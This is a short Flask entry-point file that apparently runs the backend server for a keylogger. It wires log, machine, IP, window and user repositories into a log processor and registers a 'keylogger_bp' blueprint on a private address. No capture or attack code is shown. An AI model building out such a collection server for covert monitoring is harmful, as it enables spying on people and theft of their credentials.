from flask import Flask, Blueprint

from app.services.log_proccesor import LogProcessor
from database.repository import (
    LogRepository, MachinesRepository,MachineIpRepository,
    IpRepository, WindowsRepository, UsersRepository
    )
from api.controlers import LogsController


# Repos
log_repo = LogRepository()
machine_repo = MachinesRepository()
ip_repo = IpRepository()
win_repo = WindowsRepository()
usr_repo = UsersRepository()
mach_ip_repo = MachineIpRepository()

# services
log_processor = LogProcessor(log_repo, ip_repo, usr_repo, machine_repo, win_repo, mach_ip_repo)

# controlers
log_controller = LogsController(log_processor)

app = Flask(__name__)


def register_routes():
    from api.routes import keylogger_bp, home_bp
    app.register_blueprint(keylogger_bp)
    app.register_blueprint(home_bp)
#routes


if __name__ == '__main__':
    register_routes()
    app.run(host='10.0.0.10', port=5000)